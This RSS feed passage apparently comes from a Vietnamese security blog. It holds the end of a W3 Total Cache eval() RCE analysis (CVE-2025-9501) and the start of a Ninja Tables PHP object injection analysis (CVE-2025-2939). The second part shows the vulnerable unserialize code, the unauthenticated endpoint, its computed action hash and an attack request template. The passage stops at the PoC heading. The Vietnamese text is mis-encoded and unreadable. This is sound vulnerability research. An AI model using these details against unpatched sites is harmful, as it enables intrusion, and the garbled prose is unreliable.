c√≥ th·ªÉ b·ªã l·ªô khi qu√™n b·∫≠t t√≠nh nƒÉng Page Cache m√† s·ª≠ d·ª•ng n√≥ ·ªü n∆°i Unauthenticated User c√≥ th·ªÉ th·∫•y ƒë∆∞·ª£c.&#xA;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-22-cve-2025-9501/miss_page_cache.png&#34; title=&#34;S·ª≠ d·ª•ng khi qu√™n b·∫≠t Page Cache&#34; data-thumbnail=&#34;/posts/2025-11-22-cve-2025-9501/miss_page_cache.png&#34; data-sub-html=&#34;&lt;h2&gt;Miss Page Cache&lt;/h2&gt;&lt;p&gt;S·ª≠ d·ª•ng khi qu√™n b·∫≠t Page Cache&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-22-cve-2025-9501/miss_page_cache.png&#39; alt=&#34;Miss Page Cache&#34; height=&#34;259&#34; width=&#34;427&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;S·ª≠ d·ª•ng khi qu√™n b·∫≠t Page Cache&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&lt;/div&gt;&lt;h1 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;p&gt;L·ªó h·ªïng CVE-2025-9501 xu·∫•t ph√°t t·ª´ vi·ªác plugin W3 Total Cache s·ª≠ d·ª•ng &lt;code&gt;eval()&lt;/code&gt; ƒë·ªÉ x·ª≠ l√Ω c√°c kh·ªëi ‚Äúdynamic fragment caching‚Äù (&lt;code&gt;&amp;lt;!-- mfunc ... --&amp;gt;&lt;/code&gt;) m√† kh√¥ng c√≥ b·∫•t k·ª≥ b∆∞·ªõc x√°c th·ª±c, l·ªçc ho·∫∑c sandbox n√†o. ƒêi·ªÅu n√†y cho ph√©p k·∫ª t·∫•n c√¥ng ch∆∞a x√°c th·ª±c c√≥ th·ªÉ ch√®n tr·ª±c ti·∫øp m√£ PHP v√†o n·ªôi dung trang, v√† m√£ n√†y s·∫Ω ƒë∆∞·ª£c th·ª±c thi trong giai ƒëo·∫°n &lt;code&gt;shutdown&lt;/code&gt;, sau khi WordPress ƒë√£ k·∫øt th√∫c to√†n b·ªô x·ª≠ l√Ω ch√≠nh, d·∫´n ƒë·∫øn Remote Code Execution (RCE).&lt;/p&gt;&#xA;&lt;p&gt;V·∫•n ƒë·ªÅ c√†ng nghi√™m tr·ªçng h∆°n khi logic cache v√† x·ª≠ l√Ω ƒë·∫ßu ra n·∫±m ngo√†i v√≤ng ƒë·ªùi chu·∫©n c·ªßa WordPress, khi·∫øn c√°c l·ªõp b·∫£o v·ªá nh∆∞ hook, nonce ho·∫∑c ki·ªÉm tra quy·ªÅn truy c·∫≠p kh√¥ng c√≤n hi·ªáu l·ª±c. W3TC 2.8.13 ƒë√£ lo·∫°i b·ªè vi·ªác g·ªçi &lt;code&gt;eval()&lt;/code&gt; trong c∆° ch·∫ø x·ª≠ l√Ω ƒë·ªông, ch√≠nh th·ª©c v√° l·ªó h·ªïng n√†y.&lt;/p&gt;&#xA;&lt;h1 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h1&gt;&lt;ul&gt;&#xA;&lt;li&gt;Vi·ªác s·ª≠ d·ª•ng &lt;code&gt;eval()&lt;/code&gt; trong s·∫£n ph·∫©m production g·∫ßn nh∆∞ lu√¥n d·∫´n ƒë·∫øn RCE n·∫øu ƒë·∫ßu v√†o kh√¥ng ƒë∆∞·ª£c ki·ªÉm so√°t nghi√™m ng·∫∑t.&lt;/li&gt;&#xA;&lt;li&gt;Plugin ƒë√£ x·ª≠ l√Ω n·ªôi dung ƒë·ªông &lt;strong&gt;sau to√†n b·ªô v√≤ng ƒë·ªùi WordPress&lt;/strong&gt;, khi·∫øn nhi·ªÅu l·ªõp b·∫£o v·ªá c·ªßa core b·ªã bypass.&lt;/li&gt;&#xA;&lt;li&gt;Page Fragment Caching c·ªßa W3TC cho ph√©p ch·∫°y code PHP t·ª´ HTML comment ‚Äì ch·ªâ c·∫ßn m·ªôt c·∫•u h√¨nh sai ho·∫∑c thi·∫øu ch·∫∑n ƒë·∫ßu v√†o l√† ƒë·ªß cho t·∫•n c√¥ng.&lt;/li&gt;&#xA;&lt;li&gt;RCE ƒë∆∞·ª£c k√≠ch ho·∫°t trong &lt;code&gt;register_shutdown_function()&lt;/code&gt;, khi·∫øn payload ch·∫°y ·ªü th·ªùi ƒëi·ªÉm cu·ªëi c·ªßa request ‚Äì kh√≥ b·ªã ph√°t hi·ªán b·ªüi qu√° tr√¨nh ph√¢n t√≠ch th√¥ng th∆∞·ªùng.&lt;/li&gt;&#xA;&lt;li&gt;C·∫≠p nh·∫≠t plugin ngay l·∫≠p t·ª©c l√† c√°ch b·∫£o v·ªá duy nh·∫•t trong tr∆∞·ªùng h·ª£p h·ªá th·ªëng v·∫´n ƒëang s·ª≠ d·ª•ng &amp;lt;= 2.8.12.&lt;/li&gt;&#xA;&lt;li&gt;ƒê·ªëi v·ªõi m·ªçi h·ªá th·ªëng PHP, &lt;strong&gt;tuy·ªát ƒë·ªëi tr√°nh &lt;code&gt;eval()&lt;/code&gt; n·∫øu kh√¥ng c√≥ sandbox v√† validation c·ª±c k·ª≥ ch·∫∑t&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/w3-total-cache/vulnerability/wordpress-w3-total-cache-plugin-2-8-13-unauthenticated-command-injection-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress W3 Total Cache Plugin &amp;lt; 2.8.13 is vulnerable to Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-2939 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-21-cve-2025-2939/</link>
      <pubDate>Fri, 21 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-21-cve-2025-2939/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-21-cve-2025-2939/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Plugin Ninja Tables ‚Äì Easy Data Table Builder c·ªßa WordPress t·ªìn t·∫°i l·ªó h·ªïng &lt;strong&gt;PHP Object Injection&lt;/strong&gt; trong t·∫•t c·∫£ c√°c phi√™n b·∫£n ƒë·∫øn 5.0.18, do vi·ªác gi·∫£i tu·∫ßn t·ª± (deserialization) d·ªØ li·ªáu kh√¥ng tin c·∫≠y t·ª´ tham s·ªë &lt;code&gt;args[callback]&lt;/code&gt;. L·ªó h·ªïng n√†y cho ph√©p k·∫ª t·∫•n c√¥ng ch∆∞a x√°c th·ª±c ch√®n m·ªôt ƒë·ªëi t∆∞·ª£ng PHP ƒë·ªôc h·∫°i.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-2939&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-2939&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 5.0.18&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 5.0.19&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: High (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Unauthenticated&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ninja-tables/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Ninja Tables ‚Äì Easy Data Table Builder Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Ninja Tables ‚Äì Easy Data Table Builder&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;5.0.18&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;5.0.19&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;Trong phi√™n b·∫£n l·ªói (v5.0.18):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$callback = unserialize(base64_decode($params[&amp;#39;callback&amp;#39;]));&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Trong ƒëo·∫°n m√£ n√†y, h√†m &lt;strong&gt;&lt;code&gt;unserialize()&lt;/code&gt;&lt;/strong&gt; ƒë∆∞·ª£c g·ªçi tr·ª±c ti·∫øp tr√™n d·ªØ li·ªáu ng∆∞·ªùi d√πng (&lt;code&gt;$params[&#39;callback&#39;]&lt;/code&gt; sau khi gi·∫£i m√£ base64). ƒêi·ªÅu n√†y t·∫°o ra l·ªó h·ªïng nghi√™m tr·ªçng:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Nguy c∆° Object Injection&lt;/strong&gt;: N·∫øu attacker ch√®n payload PHP object v√†o d·ªØ li·ªáu base64, qu√° tr√¨nh decode v√† unserialize s·∫Ω kh·ªüi t·∫°o object ƒë·ªôc h·∫°i, d·∫´n ƒë·∫øn &lt;strong&gt;Object Injection&lt;/strong&gt; v√† c√≥ kh·∫£ nƒÉng ti·∫øn t·ªõi &lt;strong&gt;Remote Code Execution (RCE)&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Thi·∫øu ki·ªÉm tra an to√†n&lt;/strong&gt;: Kh√¥ng c√≥ b∆∞·ªõc x√°c th·ª±c d·ªØ li·ªáu tr∆∞·ªõc khi th·ª±c hi·ªán unserialize.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Kh√¥ng c√≥ c∆° ch·∫ø fallback&lt;/strong&gt;: N·∫øu d·ªØ li·ªáu kh√¥ng h·ª£p l·ªá ho·∫∑c b·ªã l·ªói, h·ªá th·ªëng kh√¥ng c√≥ ph∆∞∆°ng √°n x·ª≠ l√Ω thay th·∫ø, khi·∫øn ·ª©ng d·ª•ng d·ªÖ b·ªã khai th√°c.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;&lt;strong&gt;B·∫£n v√° (v5.0.19):&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-21-cve-2025-2939/diff.png&#34; title=&#34;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&#34; data-thumbnail=&#34;/posts/2025-11-21-cve-2025-2939/diff.png&#34; data-sub-html=&#34;&lt;h2&gt;Diff&lt;/h2&gt;&lt;p&gt;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-21-cve-2025-2939/diff.png&#39; alt=&#34;Diff&#34; height=&#34;746&#34; width=&#34;1813&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;S·ª± thay ƒë·ªïi c·ªßa b·∫£n v√°&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;p&gt;Thay th·∫ø &lt;code&gt;unserialize()&lt;/code&gt; b·∫±ng &lt;code&gt;json_decode()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;p&gt;Kh√¥ng c√≤n d√πng &lt;code&gt;unserialize()&lt;/code&gt; ‚Üí lo·∫°i b·ªè ho√†n to√†n kh·∫£ nƒÉng &lt;code&gt;PHP Object Injection&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;code&gt;getCallback()&lt;/code&gt; ƒë∆∞·ª£c g·ªçi trong h√†m &lt;code&gt;registerAsyncRequestHandler()&lt;/code&gt;&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public static function registerAsyncRequestHandler()&#xA;{&#xA;    $action = static::makeAsyncRequestAction();&#xA;&#xA;    App::addAction(&amp;#34;admin_post_nopriv_{$action}&amp;#34;, function() {&#xA;        &#xA;        $request = App::make(&amp;#39;request&amp;#39;);&#xA;        &#xA;        $requestUrl = $request-&amp;gt;get(&amp;#39;args.url&amp;#39;);&#xA;        &#xA;        $requestMethod = $request-&amp;gt;get(&amp;#39;args.method&amp;#39;);&#xA;        &#xA;        $client = Client::make($requestUrl);&#xA;        &#xA;        $params = $request-&amp;gt;except(&#xA;            &amp;#39;action&amp;#39;, &amp;#39;args.url&amp;#39;, &amp;#39;args.method&amp;#39;,&#xA;        )[&amp;#39;args&amp;#39;];&#xA;&#xA;        $callback = static::getCallback($params);&#xA;        ...&#xA;    });&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;H√†m ƒëƒÉng k√Ω m·ªôt Ajax endpoint cho ng∆∞·ªùi d√πng ch∆∞a x√°c th·ª±c (&lt;code&gt;admin_post_nopriv_&lt;/code&gt;) v·ªõi &lt;code&gt;action&lt;/code&gt; ƒë∆∞·ª£c l·∫•y t·ª´ &lt;code&gt;makeAsyncRequestAction()&lt;/code&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;protected static function makeAsyncRequestAction()&#xA;{&#xA;    return &amp;#39;wpf-async-request-&amp;#39;.sha1(&#xA;        App::config()-&amp;gt;get(&amp;#39;app.slug&amp;#39;)&#xA;    );&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Gi√° tr·ªã tr·∫£ v·ªÅ l√† chu·ªói &lt;code&gt;&amp;quot;wpf-async-request-&amp;quot;&lt;/code&gt; n·ªëi v·ªõi &lt;code&gt;sha1()&lt;/code&gt; c·ªßa &lt;code&gt;app.slug&lt;/code&gt;. Bi·∫øt slug c·ªßa plugin l√† &lt;code&gt;ninja-tables&lt;/code&gt;, gi√° tr·ªã cu·ªëi c√πng s·∫Ω l√†:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;$params&lt;/code&gt; l√† to√†n b·ªô d·ªØ li·ªáu trong &lt;code&gt;args[...]&lt;/code&gt; c·ªßa request, sau khi b·ªè ƒëi c√°c th√¥ng tin ƒëi·ªÅu khi·ªÉn (&lt;code&gt;action&lt;/code&gt;, &lt;code&gt;args.url&lt;/code&gt;, &lt;code&gt;args.method&lt;/code&gt;)&lt;/p&gt;&#xA;&lt;p&gt;=&amp;gt; Khi g·ª≠i request t·ªõi endpoint &lt;code&gt;/wp-admin/admin-post.php&lt;/code&gt; v·ªõi &lt;code&gt;action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77&lt;/code&gt; th√¨ &lt;code&gt;getCallback($params)&lt;/code&gt; s·∫Ω ƒë∆∞·ª£c g·ªçi.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;flow&#34;&gt;&lt;span&gt;Flow&lt;/span&gt;&#xA;  &lt;a href=&#34;#flow&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;pre&gt;&lt;code&gt;graph TD&#xA;&#xA;A[&amp;#34;Unauthenticated user sends GET /wp-admin/admin-post.php?action=wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77&amp;amp;args[callback]=base64_payload&amp;#34;]&#xA;    --&amp;gt; B[&amp;#34;WordPress triggers hook admin_post_nopriv_wpf-async-request-5198d2fbe51aebbce20ad69b9ada4d77993bbc77&amp;#34;]&#xA;&#xA;B --&amp;gt; C[&amp;#34;Plugin handler calls getCallback($params)&amp;#34;]&#xA;C --&amp;gt; D[&amp;#34;Decode base64 and unserialize payload&amp;#34;]&#xA;D --&amp;gt; E[&amp;#34;Malicious object instantiated ‚Üí RCE&amp;#34;]&lt;/code&gt;&lt;/pre&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 